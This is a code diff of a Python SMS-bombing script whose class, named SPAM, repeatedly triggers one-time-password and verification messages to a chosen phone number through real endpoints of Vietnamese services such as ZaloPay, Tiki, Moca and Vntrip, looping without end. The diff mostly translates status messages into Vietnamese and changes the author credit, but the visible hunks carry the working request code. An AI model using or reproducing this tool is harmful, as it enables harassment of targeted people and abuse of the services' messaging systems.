@@ -204,9 +204,9 @@ class SPAM:
         }
         try:
             response = requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()['meta']['msg']
-            print(self.format_print("*",f"GBAY: SUCCESS!"))
+            print(self.format_print("*",f"GBAY: THÀNH CÔNG!"))
         except:
-            print(self.format_print("*",f"GBAY: ERROR!"))
+            print(self.format_print("*",f"GBAY: THẤT BẠI!"))
     
     def moca(self):
         headers = {
@@ -226,9 +226,9 @@ class SPAM:
             home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
             token = home['data']['registrationId']
             response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
-            print(self.format_print("*",f"MOCA: SUCCESS!"))
+            print(self.format_print("*",f"MOCA: THÀNH CÔNG!"))
         except:
-            print(self.format_print("*",f"MOCA: ERROR!"))
+            print(self.format_print("*",f"MOCA: THẤT BẠI!"))
             
     def zalopay(self):
         try:
@@ -258,18 +258,18 @@ class SPAM:
             }
 
             response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
-            print(self.format_print("*",f"ZALOPAY: SUCCESS!"))
+            print(self.format_print("*",f"ZALOPAY: THÀNH CÔNG!"))
         except:
-            print(self.format_print("*",f"ZALOPAY: ERROR!"))
+            print(self.format_print("*",f"ZALOPAY: THẤT BẠI!"))
     def tiki(self):
         try:
             json_data = {
                     'phone_number': self.phone,
                 }
             response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=self.ua, json=json_data).text
-            print(self.format_print("*",f"TIKI: SUCCESS!"))
+            print(self.format_print("*",f"TIKI: THÀNH CÔNG!"))
         except:
-            print(self.format_print("*",f"TIKI: ERROR!"))
+            print(self.format_print("*",f"TIKI: THẤT BẠI!"))
     def meta_vn(self):
         try:
             params = {
@@ -286,9 +286,9 @@ class SPAM:
             }
 
             response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=self.ua, json=json_data).text
-            print(self.format_print("*",f"METAVN: SUCCESS!"))
+            print(self.format_print("*",f"METAVN: THÀNH CÔNG!"))
         except:
-            print(self.format_print("*",f"METAVN: ERROR!"))
+            print(self.format_print("*",f"METAVN: THẤT BẠI!"))
     def vntrip(self):
         try:
             json_data = {
@@ -297,9 +297,9 @@ class SPAM:
             }
 
             response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=self.ua, json=json_data).text
-            print(self.format_print("*",f"VNTRIP: SUCCESS!"))
+            print(self.format_print("*",f"VNTRIP: THÀNH CÔNG!"))
         except:
-            print(self.format_print("*",f"VNTRIP: ERROR!"))
+            print(self.format_print("*",f"VNTRIP: THẤT BẠI!"))
     def run_sendotp(self):
         while True:
             self.send_otp()
@@ -319,7 +319,7 @@ class SPAM:
                     break
                 print(self.format_print("!", "SỐ ĐIỆN THOẠI DƯỚI <10 SỐ XIN NHẬP LẠI !"))
             if self.phone == '0346720407':
-                print(self.format_print("!", "LÀM ƠN ĐỪNG SPAM SỐ ĐIỆN THOẠI BDT"))
+                print(self.format_print("!", "LÀM ƠN ĐỪNG SPAM SỐ ĐIỆN THOẠI TÔI"))
             time.sleep(3)
             
         
@@ -342,4 +342,4 @@ if __name__ == "__main__":
         SPAM().run()
     except KeyboardInterrupt:
         time.sleep(3)
-        sys.exit('\n'+SPAM().format_print('*', 'BuiDucTai:)'))
+        sys.exit('\n'+SPAM().format_print('*', 'DuongNghia:)'))
